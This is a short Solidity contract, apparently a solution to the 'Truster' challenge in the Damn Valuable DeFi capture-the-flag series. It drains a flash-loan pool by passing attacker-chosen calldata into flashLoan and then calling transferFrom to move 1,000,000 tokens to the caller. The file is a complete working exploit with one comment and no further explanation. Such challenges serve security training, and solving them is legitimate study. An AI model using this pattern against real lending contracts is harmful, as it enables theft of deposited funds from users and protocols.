// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../truster/TrusterLenderPool.sol";

contract AttackTruster {
    TrusterLenderPool trust;
    IERC20Upgradeable public immutable damnValuableToken;


    constructor(address _trust, address tokenAddress) {
        trust = TrusterLenderPool(_trust);
        damnValuableToken = IERC20Upgradeable(tokenAddress);

    }

    function attack(
        uint256 amount,
        address borrower,
        address target,
        bytes calldata data
    ) external {
        trust.flashLoan(amount, borrower, target, data);
        // Once approved transfer
        damnValuableToken.transferFrom(address(trust), msg.sender, 1000000 ether);

    }
}